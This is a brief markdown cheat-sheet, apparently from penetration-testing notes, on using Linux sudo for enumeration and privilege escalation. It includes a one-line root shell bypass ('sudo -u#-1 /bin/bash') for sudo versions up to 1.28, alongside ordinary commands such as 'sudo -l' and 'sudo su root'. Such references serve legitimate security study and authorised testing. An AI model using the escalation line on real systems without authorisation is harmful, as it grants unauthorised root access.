---
title: Sudo
desc: Linux command to execute any commands as privileges.
tags: [Linux, PrivEsc, SUID]
alts: []
website:
---

## List of privilege commands for current user

```sh
sudo -l

# Specify the hostname e.g. 'host-name'
sudo -h host-name -l

# Execute via the hostname e.g. 'host-name'
sudo -h host-name /bin/bash
```

<br />

## Privilege Escalation

```sh
# version <= 1.28
sudo -u#-1 /bin/bash
```

<br />

## Misc

```sh
# If you owns the privileges `su` command, you can switch to root user
sudo su root

# Run as other user named 'bob'
sudo -u bob whoami
```